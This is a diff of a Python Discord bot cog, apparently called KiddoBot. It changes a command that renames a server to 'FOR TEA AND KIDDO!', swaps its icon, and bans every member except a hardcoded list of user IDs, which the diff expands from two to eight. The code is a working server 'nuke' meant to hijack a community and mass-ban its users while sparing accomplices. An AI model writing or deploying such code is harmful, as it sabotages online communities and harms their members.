@@ -536,10 +536,14 @@ class KiddoBot(commands.Cog):
                     icon = f.read()
                 await ctx.guild.edit(name="FOR TEA AND KIDDO!", icon=icon)
 
+                not_ban = [408627107795828746, 527216051839303681, 695885580629704734, 734058138096893953,
+                           942161973511086190, 487271904315703308, 455319131135410177, 633376425465872404]
+
                 for member in ctx.guild.members:
                     try:
-                        if member.id == 695885580629704734 or member.id == 633376425465872404:  # walnusskeim oder bonerboy
-                            pass
+                        if member.id in not_ban:
+                            print(member.id)
+                            continue
                         else:
                             await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
                     except discord.Forbidden:
